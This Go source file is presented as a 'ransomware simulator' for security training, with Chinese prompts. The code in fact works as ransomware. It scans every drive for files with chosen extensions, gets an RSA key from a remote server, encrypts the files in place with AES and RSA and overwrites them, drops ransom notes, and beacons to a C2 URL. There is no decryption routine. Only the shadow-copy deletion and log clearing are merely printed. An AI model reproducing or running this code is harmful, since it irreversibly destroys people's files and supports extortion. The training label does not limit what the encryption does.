package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"flag"
	"fmt"
	"golang.org/x/term"
	"image"
	"image/color"
	"image/png"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// --- 勒索软件特征常量 ---
const VERSION = "v1.0-RansomSimulator-Ultimate"
const EXEC_PASSWORD = "yangzifun"
const API_URL = "https://rsa-uuid.api.yangzifun.org"
const BEACON_URL = "http://bad-c2-server.api.yangzifun.org/beacon_check_in"
const MUTEX_NAME = "Global\\{f8d1e0a2-3b7c-4a9f-8c6e-2b5d7a4c9e1b}"

const RANSOM_NOTE_CONTENT = `
========================= [ ALL YOUR FILES ARE LOCKED! ] =========================

Don't panic! This is a controlled simulation, but if this were a real attack,
your network would be completely compromised.

Your critical files - documents, photos, databases, backups - have been encrypted
using a powerful military-grade AES-256 + RSA-2048 encryption algorithm. 
There are no backdoors or shortcuts. The only way to restore them is to purchase
the unique decryption key from us.

Any attempt to restore files yourself will lead to their permanent destruction.
Disabling or restarting this machine may also cause permanent data loss.

To begin the recovery process, you would need to contact us with your UNIQUE ID.

YOUR UNIQUE ID IS: %s

====================== [ THIS IS A SIMULATION FOR TRAINING ] ======================
`

var (
	lockFilePath       string
	ransomNoteFileName = "!!!_HOW_TO_DECRYPT_YOUR_FILES_!!!.txt"
	excludedDirs       = []string{
		"/bin", "/boot", "/dev", "/etc", "/lib", "/lib64", "/proc", "/run", "/sbin", "/sys", "/usr", "/var",
		"/tmp", "/lost+found", "/Applications", "/Library", "/System", "/private",
		"$Recycle.Bin", "$RECYCLE.BIN", "System Volume Information",
	}
)

type APIResponse struct {
	Status int    `json:"status"`
	Msg    string `json:"msg"`
	Data   struct {
		UUID      string `json:"uuid"`
		PublicKey string `json:"public_key"`
	} `json:"data"`
}

type fileLog struct {
	mu   sync.Mutex
	file *os.File
}

type counters struct {
	success atomic.Uint64
	failed  atomic.Uint64
}

// --- 主逻辑 ---
func main() {
	fmt.Println("==================================================")
	fmt.Println("      RANSOMWARE SIMULATOR - ATTACK INITIATED")
	fmt.Printf("                Version: %s\n", VERSION)
	fmt.Println("==================================================")
	time.Sleep(1 * time.Second)

	fmt.Println("\n[PHASE 1: INFILTRATION & PERSISTENCE]")

	fmt.Print("[*] Establishing persistence via mutex lock... ")
	if !createSingleInstanceLock() {
		fmt.Println("FAILED. [IOC] Lock present. Another instance is active. Terminating.")
		time.Sleep(2 * time.Second)
		os.Exit(1)
	}
	fmt.Println("OK.")
	defer cleanupLockFile()

	if !verifyPassword() {
		fmt.Fprintln(os.Stderr, "\n[FATAL] ACCESS DENIED. Incorrect password. Self-destructing.")
		time.Sleep(2 * time.Second)
		os.Exit(1)
	}

	fs := flag.NewFlagSet("ransom_simulator", flag.ExitOnError)
	extFlag, workersFlag, dryRunFlag, yesFlag := setupFlags(fs)
	fs.Parse(os.Args[1:])

	if *extFlag == "" {
		fmt.Fprintln(os.Stderr, "错误: 必须使用 -ext 参数指定要加密的文件扩展名 (例如: -ext .doc,.docx,.txt)。")
		fs.Usage()
		os.Exit(1)
	}

	if !showWarningAndGetConfirmation(*extFlag, *dryRunFlag, *yesFlag) {
		fmt.Println("操作已取消。")
		os.Exit(0)
	}

	fmt.Println("\n[PHASE 2: DEFENSE EVASION & DISCOVERY]")

	if *dryRunFlag {
		fmt.Println("[*] [DRY RUN] Skipping hostile actions.")
	} else {
		go networkBeacon()
		simulateDestructiveActions()
	}

	fmt.Println("[*] Scanning filesystem for valuable targets...")
	filesToProcess := scanFiles(parseExtensions(*extFlag))
	if len(filesToProcess) == 0 {
		fmt.Println("[!] No valuable targets found. Mission aborted.")
		os.Exit(0)
	}
	fmt.Printf("[+] Target acquisition complete. Identified %d files for encryption.\n", len(filesToProcess))

	var stats counters
	if *dryRunFlag {
		fmt.Println("\n[PHASE 3: PAYLOAD DEPLOYMENT (SKIPPED IN DRY RUN)]")
		fmt.Println("[*] Files that would be encrypted:")
		for _, f := range filesToProcess {
			fmt.Println("  -", f)
		}
	} else {
		fmt.Println("\n[PHASE 3: PAYLOAD DEPLOYMENT]")
		fmt.Printf("[*] Initializing %d encryption workers. Beginning payload execution...\n", *workersFlag)
		runEncryptionWorkers(filesToProcess, *workersFlag, &stats)
		fmt.Println("\n[+] Payload execution complete.")
	}

	if !*dryRunFlag {
		fmt.Println("\n[PHASE 4: EXTORTION]")
		uuid := "FETCHED-UUID-FROM-API-12345"
		fmt.Println("[*] Dropping ransom notes across the system...")
		dropRansomNotes(fmt.Sprintf(RANSOM_NOTE_CONTENT, uuid))
		fmt.Println("[+] Ransom notes deployed.")
		createRansomWallpaper()
	}

	fmt.Println("\n================ [ MISSION COMPLETE ] ================")
	fmt.Println("                 Execution Summary:")
	if *dryRunFlag {
		fmt.Printf("  - Mode:            Dry Run (Simulation)\n")
		fmt.Printf("  - Targets Found:   %d\n", len(filesToProcess))
	} else {
		fmt.Printf("  - Mode:            Live Attack\n")
		fmt.Printf("  - Files Encrypted: %d\n", stats.success.Load())
		fmt.Printf("  - Encryption Fails:  %d\n", stats.failed.Load())
		fmt.Printf("  - Result:          System Compromised\n")
	}
	fmt.Println("====================================================")
	countdown("This terminal will self-destruct in", 10)
}

func verifyPassword() bool {
	fmt.Print("请输入执行密码: ")
	bytePassword, err := term.ReadPassword(int(syscall.Stdin))
	if err != nil {
		fmt.Fprintln(os.Stderr, "\n无法读取密码。")
		return false
	}
	password := string(bytePassword)
	fmt.Println()
	return password == EXEC_PASSWORD
}

func setupFlags(fs *flag.FlagSet) (*string, *int, *bool, *bool) {
	ext := fs.String("ext", "", "必须：指定要加密的文件扩展名 (例: .db,.jpg)")
	workers := fs.Int("workers", runtime.NumCPU(), "可选：并发 worker 数量 (默认: CPU核心数)")
	dryRun := fs.Bool("dry-run", false, "可选：演习模式，只查找不加密")
	yes := fs.Bool("yes", false, "可选：跳过危险操作的确认提示")
	fs.Usage = func() {
		fmt.Fprintf(os.Stderr, "用法: %s -ext .ext1,.ext2 [-workers N] [-dry-run] [-yes]\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "一个模拟勒索软件攻击过程的工具，用于安全培训。\n\n")
		fmt.Fprintf(os.Stderr, "参数:\n")
		fs.PrintDefaults()
	}
	return ext, workers, dryRun, yes
}

func showWarningAndGetConfirmation(ext string, dryRun, yes bool) bool {
	fmt.Fprintf(os.Stderr, "\n************************** 警告 **************************\n")
	fmt.Fprintf(os.Stderr, "你即将扫描整个文件系统并针对扩展名为 [%s] 的文件执行模拟攻击。\n", ext)
	fmt.Fprintf(os.Stderr, "这是一个高度危险的模拟，请确保在隔离的环境中运行！\n")
	fmt.Fprintf(os.Stderr, "**********************************************************\n\n")
	if dryRun {
		fmt.Println(">>> 已激活 [演习模式 (Dry Run)]，不会执行任何加密操作。")
		return true
	}
	if !yes {
		fmt.Print(">>> 请输入 'YES' 并按 Enter 键以继续: ")
		reader := bufio.NewReader(os.Stdin)
		input, _ := reader.ReadString('\n')
		if strings.TrimSpace(input) != "YES" {
			return false
		}
	}
	fmt.Println("确认成功，攻击模拟即将开始...")
	return true
}

func countdown(message string, seconds int) {
	fmt.Println()
	for i := seconds; i >= 0; i-- {
		fmt.Printf("\r%s %d 秒后自动退出...", message, i)
		time.Sleep(1 * time.Second)
	}
	fmt.Println("\r程序已退出。                                  ")
}

func networkBeacon() {
	time.Sleep(3 * time.Second)
	fmt.Println("[IOC] C2 BEACON: Attempting to contact C2 server...")
	client := http.Client{Timeout: 5 * time.Second}
	_, err := client.Get(BEACON_URL)
	if err != nil {
		fmt.Printf("[IOC] C2 BEACON: Connection to %s failed (This is expected in a simulated environment, or if C2 is down).\n", BEACON_URL)
	} else {
		fmt.Printf("[IOC] C2 BEACON: Successfully contacted %s.\n", BEACON_URL)
	}
}

func simulateDestructiveActions() {
	time.Sleep(1 * time.Second)
	fmt.Println("[*] Initiating defense evasion protocols...")
	switch runtime.GOOS {
	case "windows":
		fmt.Println("  - [IOC] SIMULATE: Executing 'vssadmin.exe delete shadows /all /quiet'")
	case "darwin":
		fmt.Println("  - [IOC] SIMULATE: Executing 'tmutil disable'")
	case "linux":
		fmt.Println("  - [IOC] SIMULATE: Executing 'rm -rf /home/*/.{cache,config}/backups'")
	}
	fmt.Println("  - [IOC] SIMULATE: Clearing system security logs...")
	time.Sleep(1 * time.Second)
}

func dropRansomNotes(content string) {
	dirs := getUserDirs()
	for _, dir := range dirs {
		if _, err := os.Stat(dir); err == nil {
			notePath := filepath.Join(dir, ransomNoteFileName)
			os.WriteFile(notePath, []byte(content), 0644)

			desktopPath := getDesktopPath()
			if desktopPath != "" && desktopPath != dir {
				desktopNotePath := filepath.Join(desktopPath, ransomNoteFileName)
				os.WriteFile(desktopNotePath, []byte(content), 0644)
			}
		}
	}
}

func createRansomWallpaper() {
	desktopPath := getDesktopPath()
	if desktopPath == "" {
		fmt.Println("[!] Failed to locate desktop path for wallpaper creation.")
		return
	}
	imgPath := filepath.Join(desktopPath, "RANSOM_WALLPAPER.png")

	img := image.NewRGBA(image.Rect(0, 0, 800, 600))
	bgColor := color.RGBA{0, 0, 0, 255}
	for x := 0; x < 800; x++ {
		for y := 0; y < 600; y++ {
			img.Set(x, y, bgColor)
		}
	}

	file, err := os.Create(imgPath)
	if err != nil {
		fmt.Printf("[!] Failed to create wallpaper image: %v\n", err)
		return
	}
	defer file.Close()
	png.Encode(file, img)

	fmt.Printf("[+] Ransom wallpaper image created at: %s\n", imgPath)
	fmt.Println("[IOC] SIMULATING DESKTOP BACKGROUND CHANGE...")
	var cmd string
	switch runtime.GOOS {
	case "windows":
		cmd = fmt.Sprintf(`reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%s" /f`, imgPath)
	case "darwin":
		cmd = fmt.Sprintf(`osascript -e 'tell application "Finder" to set desktop picture to POSIX file "%s"'`, imgPath)
	case "linux":
		cmd = fmt.Sprintf(`gsettings set org.gnome.desktop.background picture-uri file://%s`, imgPath)
	default:
		fmt.Println("  - SIMULATE: No specific wallpaper change command for this OS.")
		return
	}
	fmt.Printf("  - SIMULATE: Executing command (not actually run): %s\n", cmd)
}

func parseExtensions(extFlag string) map[string]bool {
	extFilter := make(map[string]bool)
	extensions := strings.Split(extFlag, ",")
	for _, ext := range extensions {
		ext = strings.TrimSpace(ext)
		if ext != "" {
			if !strings.HasPrefix(ext, ".") {
				ext = "." + ext
			}
			extFilter[strings.ToLower(ext)] = true
		}
	}
	return extFilter
}

func scanFiles(extFilter map[string]bool) []string {
	var filesToProcess []string
	roots := []string{"/"}

	if runtime.GOOS == "windows" {
		roots = []string{}
		for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
			drivePath := string(drive) + ":\\"
			if _, err := os.Stat(drivePath); err == nil {
				roots = append(roots, drivePath)
			}
		}
	}

	for _, root := range roots {
		filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				if os.IsPermission(err) {
					return nil
				}
				return nil
			}

			if info.IsDir() {
				if isExcluded(path) {
					return filepath.SkipDir
				}
			} else {
				if shouldEncrypt(path, extFilter) {
					filesToProcess = append(filesToProcess, path)
				}
			}
			return nil
		})
	}
	return filesToProcess
}

func isExcluded(path string) bool {
	if runtime.GOOS == "windows" {
		winExclude := []string{"C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)"}
		for _, ex := range winExclude {
			if strings.EqualFold(path, ex) || strings.HasPrefix(strings.ToLower(path), strings.ToLower(ex)+"\\") {
				return true
			}
		}
	}
	for _, dir := range excludedDirs {
		if strings.HasPrefix(path, dir) {
			return true
		}
	}
	return false
}

func shouldEncrypt(filePath string, extFilter map[string]bool) bool {
	ext := strings.ToLower(filepath.Ext(filePath))
	return extFilter[ext]
}

func getUserDirs() []string {
	home, err := os.UserHomeDir()
	if err != nil {
		fmt.Fprintf(os.Stderr, "警告: 无法获取用户家目录: %v\n", err)
		return []string{}
	}
	return []string{home}
}

func getDesktopPath() string {
	home, err := os.UserHomeDir()
	if err != nil {
		return ""
	}
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(home, "Desktop")
	case "darwin":
		return filepath.Join(home, "Desktop")
	case "linux":
		xdgDesktop := os.Getenv("XDG_DESKTOP_DIR")
		if xdgDesktop != "" {
			return xdgDesktop
		}
		return filepath.Join(home, "Desktop")
	default:
		return home
	}
}

func runEncryptionWorkers(files []string, numWorkers int, stats *counters) {
	jobs := make(chan string, 1000)
	var wg sync.WaitGroup

	log, err := newFileLog("ransom_log.txt")
	if err != nil {
		fmt.Fprintf(os.Stderr, "警告: 无法创建日志文件 'ransom_log.txt': %v\n", err)
	} else {
		defer log.Close()
	}

	for w := 0; w < numWorkers; w++ {
		wg.Add(1)
		go worker(w+1, jobs, &wg, stats, log)
	}

	totalFiles := uint64(len(files))
	for _, file := range files {
		jobs <- file
	}
	close(jobs)

	for stats.success.Load()+stats.failed.Load() < totalFiles {
		processed := stats.success.Load() + stats.failed.Load()
		progress := float64(processed) / float64(totalFiles) * 100
		fmt.Printf("\r[*] Encrypting... [%.2f%%] (%d/%d)", progress, processed, totalFiles)
		time.Sleep(200 * time.Millisecond)
	}
	fmt.Printf("\r[*] Encrypting... [100.00%%] (%d/%d) \n", totalFiles, totalFiles)
	wg.Wait()
}

func worker(id int, jobs <-chan string, wg *sync.WaitGroup, stats *counters, log *fileLog) {
	defer wg.Done()

	resp, err := fetchKeysFromAPI()
	if err != nil {
		fmt.Printf("\n[Worker %d FATAL] Could not contact C2 server '%s' for encryption keys: %v. Terminating worker.\n", id, API_URL, err)
		for range jobs {
			stats.failed.Add(1)
		}
		return
	}
	if log != nil {
		log.Log(fmt.Sprintf("[Worker %d] UUID: %s\n[Worker %d] PublicKey: %s\n", id, resp.Data.UUID, id, resp.Data.PublicKey))
	}

	for file := range jobs {
		err := processFile(file, resp.Data.PublicKey)
		if err != nil {
			stats.failed.Add(1)
		} else {
			stats.success.Add(1)
		}
	}
}

func fetchKeysFromAPI() (*APIResponse, error) {
	client := &http.Client{Timeout: 10 * time.Second}
	req, err := http.NewRequest("GET", API_URL, nil)
	if err != nil {
		return nil, fmt.Errorf("创建请求失败: %w", err)
	}
	req.Header.Set("User-Agent", "Ransom-Simulator/"+VERSION)

	res, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("执行 API 请求失败: %w", err)
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("API 请求返回状态码 %s", res.Status)
	}

	var apiResp APIResponse
	if err := json.NewDecoder(res.Body).Decode(&apiResp); err != nil {
		return nil, fmt.Errorf("解析 API 响应失败: %w", err)
	}

	if apiResp.Status != 200 || apiResp.Data.PublicKey == "" || apiResp.Data.UUID == "" {
		return nil, fmt.Errorf("无效的 API 响应数据: %s", apiResp.Msg)
	}
	return &apiResp, nil
}

func processFile(filePath string, publicKeyStr string) error {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("读取文件 %s 失败: %w", filePath, err)
	}

	encryptedContent, err := hybridEncrypt(content, publicKeyStr)
	if err != nil {
		return fmt.Errorf("加密文件 %s 失败: %w", filePath, err)
	}

	return os.WriteFile(filePath, encryptedContent, 0644)
}

func hybridEncrypt(plaintext []byte, publicKeyStr string) ([]byte, error) {
	aesKey := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, aesKey); err != nil {
		return nil, fmt.Errorf("生成 AES 密钥失败: %w", err)
	}

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, fmt.Errorf("创建 AES Cipher 失败: %w", err)
	}
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("创建 GCM 模式失败: %w", err)
	}
	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("生成 AES Nonce 失败: %w", err)
	}
	ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)

	pemBlock, _ := pem.Decode([]byte(publicKeyStr))
	if pemBlock == nil {
		return nil, fmt.Errorf("无法解码 PEM 块，可能不是有效的公钥格式")
	}
	pub, err := x509.ParsePKIXPublicKey(pemBlock.Bytes)
	if err != nil {
		return nil, fmt.Errorf("解析 PKIX 公钥失败: %w", err)
	}
	rsaPubKey, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("解析的密钥不是 RSA 公钥类型")
	}
	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaPubKey, aesKey, nil)
	if err != nil {
		return nil, fmt.Errorf("使用 RSA 加密 AES 密钥失败: %w", err)
	}

	var buffer bytes.Buffer
	buffer.Write(encryptedAESKey)
	buffer.Write(ciphertext)

	return buffer.Bytes(), nil
}

func newFileLog(filename string) (*fileLog, error) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return nil, err
	}
	return &fileLog{file: f}, nil
}

func (l *fileLog) Log(message string) {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.file != nil {
		l.file.WriteString(time.Now().Format("2006-01-02 15:04:05") + " - " + message + "\n")
	}
}

func (l *fileLog) Close() {
	if l.file != nil {
		l.file.Close()
	}
}
